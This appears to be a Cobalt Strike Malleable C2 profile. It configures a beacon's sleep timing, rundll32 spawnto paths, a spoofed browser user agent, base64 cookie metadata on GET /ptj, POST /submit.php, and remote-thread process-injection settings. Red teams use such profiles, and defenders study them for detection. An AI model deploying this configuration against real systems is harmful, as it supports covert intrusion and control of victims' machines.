set sleeptime "60000";
set jitter "0";
set spawnto_x86 "%windir%\syswow64\rundll32.exe";
set spawnto_x64 "%windir%\sysnative\rundll32.exe";
set useragent "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; WOW64; Trident/5.0)";

http-get {
    set uri "/ptj";
    set verb "GET";

    server {

        output {
            print;
        }
    }

    client {

        metadata {
            base64;
            header "Cookie";
        }
    }
}

http-post {
    set verb "POST";
    set uri "/submit.php";

    client {
        header "Content-Type" "application/octet-stream";

        id {
            parameter "id";
        }

        output {
            print;
        }
    }
}

stage {
    set cleanup "0";
}

process-inject {
    set startrwx "true";
    set userwx "true";

    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
    set allocator "VirtualAllocEx";
}
